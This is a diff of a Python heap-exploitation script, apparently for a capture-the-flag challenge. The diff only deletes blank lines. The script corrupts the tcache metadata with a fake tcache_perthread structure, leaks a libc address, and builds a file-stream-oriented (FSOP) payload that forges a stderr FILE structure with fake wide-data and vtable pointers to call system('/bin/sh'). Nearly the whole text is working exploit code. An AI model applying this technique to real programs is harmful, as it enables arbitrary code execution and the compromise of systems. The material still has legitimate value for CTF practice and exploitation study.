@@ -193,7 +193,6 @@ malloc(4,0xf0,b"")
 malloc(5,0xf0,b"")
 
 fake_pthread = pack(0x2)+pack(0x0)+pack(0x0)+p32(0x0)+p8(0x0)+p8(0x0)+p8(0x7)
-
 edit(5,(fake_pthread))
 free(0x2)
 view(0x2)
@@ -212,50 +211,34 @@ edit(0x4,stderr)
 
 #FSOP#
 system_addr =libc_leak+0x58750
-
 libc_base = libc_leak
 stderr_address = libc_base+0x2044e0
-
 fake_wide_data = stderr_address-0x48
 wide_vtable  = stderr_address
-
-
-
 lock = libc_base+0x205700
 fake_stderr_vtable = libc_base+0x202228##jumps
-
 chain = libc_base+0x2045c0
 
 payload =pack(0x3b01010101010101)#0x0
 payload+=b"/bin/sh\x00"#0x8
-
 payload+=pack(0x0)#0x10
-
 payload+=b"\x00"*(0x20-0x18)
-
 payload +=pack(0x0)#0x20
 payload+=pack(0x1)#0x28
-
 payload+=p8(0x0)*(0x60-0x30)
-
 payload+=pack(system_addr)#60
 payload+=pack(chain)#68
-
 payload+=p8(0x0)*(0x88-0x70)
-
 payload+=pack(lock)#0x88
 payload+=p8(0x0)*(0x98-0x90)#0x90
 payload+=pack(wide_vtable-0x8)#0x98
 payload+=p8(0x0)*(0xa0-0x90-0x10)
-
 payload+=pack(fake_wide_data)#a0
 payload+=pack(0x0)#a8
 payload+=p8(0x0)*(0xd8-0xa8-0x8)
-
 payload+=pack(fake_stderr_vtable)
 
 print(f"fake wide data address = {hex(fake_wide_data)}")
-
 print(f"fake_wide vtable address is {hex(wide_vtable)}")
 
 malloc(0x6,0xf0,b"a")
